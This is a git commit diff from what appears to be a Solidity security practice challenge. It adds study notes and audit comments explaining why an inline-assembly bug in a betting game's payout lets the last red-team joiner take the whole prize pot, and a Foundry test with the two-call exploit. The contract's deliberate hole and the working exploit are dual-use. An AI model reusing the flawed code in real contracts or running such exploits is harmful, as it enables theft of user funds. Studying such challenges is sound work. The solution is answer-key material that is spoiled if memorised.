0a8132002bd61b9ec330883a67c531ec4fcae8f1
jtardioli <joshua.tardioli@gmail.com>
2025-06-19 11:25:24 -0400

    problem 3 complete

--- src/3_IKnowYulNeverHackThis.sol
+++ src/3_IKnowYulNeverHackThis.sol
@@ -1,18 +1,40 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.22;
 
+/* 
+- Why would you need a winners array if there is only 1 winner?
+    A: The team wins not an individual so we need the array to keep  track of all the winning players on the team
+
+- Whats the difference between external and public functions?
+    A: Exteranl functions do not copy the variables to memory because they come from the call data
+       This makes them slightly more efficient, but unlick public functions they cannot be used internally
+- What if someone tries to join both teams
+  A: They will be blocked because of the isPlaying mapping
+ */
 
 contract IKnowYulNeverHackThis {
-
     address[] public redTeam;
     address[] public blueTeam;
     bool locked;
     uint256 constant minAmountOfPlayers = 10;
+    /* 
+        ?
+        Its strange that they would keep track of the total number of players in a variable
+        and not just use the length of the arrays. This might be were something goes wrong
+     */
     uint256 public playersCount;
+    /* 
+        ?
+        Why do we need a mapping of is Playing, are players in the array
+        not automatically playing
+        A: This is a more efficient way to check if the player is already playing to avoid duplicates
+     */
     mapping(address => bool) public isPlaying;
-    enum Team { Red, Blue }
-    
 
+    enum Team {
+        Red,
+        Blue
+    }
 
     function joinRedTeam() external payable {
         require(msg.value == 1 ether, "This game ain't free");
@@ -21,19 +43,25 @@ contract IKnowYulNeverHackThis {
         redTeam.push(msg.sender);
 
         isPlaying[msg.sender] = true;
-        playersCount++; 
+        playersCount++;
     }
 
     function joinBlueTeam() external payable {
         require(msg.value == 1 ether, "This game ain't free");
         require(!isPlaying[msg.sender], "Start playing already!");
 
-        blueTeam.push(msg.sender); 
+        blueTeam.push(msg.sender);
 
         isPlaying[msg.sender] = true;
-        playersCount++; 
+        playersCount++;
     }
-    
+
+    /* 
+        ?
+        Is the winner just woever calls the define winners function first
+        A: It seems like it
+     */
+
     function defineWinners(bool _isBlueTeam) external {
         require(locked == false, "This isn't a reentrancey challenge");
         require(playersCount >= minAmountOfPlayers, "Game isn't over yet");
@@ -43,74 +71,69 @@ contract IKnowYulNeverHackThis {
         address[] memory winners = new address[](1);
 
         if (_isBlueTeam) {
-            for(uint256 j; j < blueTeam.length; ++j) {
+            for (uint256 j; j < blueTeam.length; ++j) {
                 address winner = blueTeam[j];
                 assembly {
-
                     let location := winners
-  
+
                     let length := mload(winners)
-        
-                    let nextMemoryLocation := add( location, mul( length, 0x20 ) )
+
+                    let nextMemoryLocation := add(location, mul(length, 0x20))
                     let freeMem := mload(0x40)
 
-                    let newMsize := add( freeMem, 0x20 )
+                    let newMsize := add(freeMem, 0x20)
 
-                    if iszero( eq( freeMem, nextMemoryLocation) ){
+                    if iszero(eq(freeMem, nextMemoryLocation)) {
                         let currVal
                         let prevVal
-                    
+
                         for { let i := nextMemoryLocation } lt(i, newMsize) { i := add(i, 0x20) } {
-                        
                             currVal := mload(i)
                             mstore(i, prevVal)
                             prevVal := currVal
-                        
                         }
                     }
 
                     mstore(nextMemoryLocation, winner)
-        
-                    length := add( length, 1 )
-        
-                    mstore( location, length )
 
-                    mstore(0x40, newMsize )
+                    length := add(length, 1)
+
+                    mstore(location, length)
+
+                    mstore(0x40, newMsize)
                 }
             }
-            
         } else {
-            for(uint256 j; j < redTeam.length; ++j) {
+            for (uint256 j; j < redTeam.length; ++j) {
                 address winner = redTeam[j];
                 assembly {
-
                     let location := winners
-     
+
                     let length := mload(winners)
-        
-                    let nextMemoryLocation := add( location, mul( length, 0x20 ) )
+
+                    let nextMemoryLocation := add(location, mul(length, 0x20))
                     let freeMem := mload(0x40)
 
-                    let newMsize := add( freeMem, 0x20 )
+                    let newMsize := add(freeMem, 0x20)
 
-                    if iszero( eq( freeMem, nextMemoryLocation) ){
+                    if iszero(eq(freeMem, nextMemoryLocation)) {
                         let currVal
                         let prevVal
-                    
+
+                        // make room for newVal by shifting other memory variables forward
                         for { let i := nextMemoryLocation } lt(i, newMsize) { i := add(i, 0x20) } {
-                        
                             currVal := mload(i)
                             mstore(i, prevVal)
                             prevVal := currVal
-                        
                         }
                     }
-                    
-                    mstore(nextMemoryLocation, winner)
-        
-                    length := add( length, 1 )
 
-                    mstore(0x40, newMsize )
+                    mstore(nextMemoryLocation, winner)
+
+                    length := add(length, 1)
+
+                    // @audit the new array size is not being updated so the length of the array will always be 1
+                    mstore(0x40, newMsize)
                 }
             }
         }
@@ -119,7 +142,13 @@ contract IKnowYulNeverHackThis {
 
         uint256 i;
         uint256 winnersLength = winners.length;
-        for(i; i < winners.length; ++i) {
+
+        /* 
+            @audit If red team is the winner, the array length will always be 1, and because the array 
+            is expanded be pushing all the other values forward, the last person to join the red team will be
+            at the first position in the winners array. meaning they can steal all of the prize money 
+        */
+        for (i; i < winners.length; ++i) {
             (bool sent, bytes memory data) = winners[i].call{value: shareOfPrize}("");
         }
 
--- test/3_IKnowYulNeverHackThis.t.sol
+++ test/3_IKnowYulNeverHackThis.t.sol
@@ -1,30 +1,27 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.22;
 
-import { Test, console } from "forge-std/Test.sol";
-import { IKnowYulNeverHackThis } from "../src/3_IKnowYulNeverHackThis.sol";
-import { IKnowYulNeverHackThisHelper } from "../test_helper/3_IKnowYulNeverHackThisSetup.sol";
-
+import {Test, console} from "forge-std/Test.sol";
+import {IKnowYulNeverHackThis} from "../src/3_IKnowYulNeverHackThis.sol";
+import {IKnowYulNeverHackThisHelper} from "../test_helper/3_IKnowYulNeverHackThisSetup.sol";
 
 contract IKnowYulNeverHackThisTest is Test {
     IKnowYulNeverHackThis public target;
-
 
     function setUp() public {
         IKnowYulNeverHackThisHelper dontpeak = new IKnowYulNeverHackThisHelper();
         target = dontpeak.deployed();
     }
 
-
     function test_GetThisPassing_3(uint256 _guess) public {
         address hacker = address(0xBAD);
         vm.deal(hacker, 1 ether);
 
         vm.startPrank(hacker);
-        
+        target.joinRedTeam{value: 1 ether}();
+        target.defineWinners(false);
         vm.stopPrank();
-        
+
         assertEq(hacker.balance, 10 ether);
     }
-
 }
